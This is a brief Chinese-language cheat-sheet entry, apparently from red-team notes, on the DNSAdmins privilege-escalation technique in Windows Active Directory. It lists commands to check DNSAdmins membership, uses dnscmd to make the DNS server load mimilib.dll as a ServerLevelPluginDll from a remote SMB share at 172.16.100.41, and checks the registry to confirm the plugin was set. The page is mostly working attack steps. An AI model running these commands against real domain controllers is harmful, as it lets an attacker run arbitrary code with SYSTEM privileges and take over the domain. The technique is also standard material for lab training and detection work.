# DNSAdmin

当我们可以访问恰好是DNSAdmins组成员的用户帐户时，或者当受感染的用户帐户具有对DNS服务器对象的写特权时，可以使用此方法。您可以使用以下命令检查用户是否在DNSAdmins组中：

```powershell
# 查看是否存在DNSAdmins组中
net user <userName> /domain
eg: net user comp /domain

- regedit

# 将dll注入到dns中
dnscmd dcorp-dc /config /serverlevelplugindll \\172.16.100.41:8088\mimilib.dll

# 检查dll是否注入到dms中
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
```
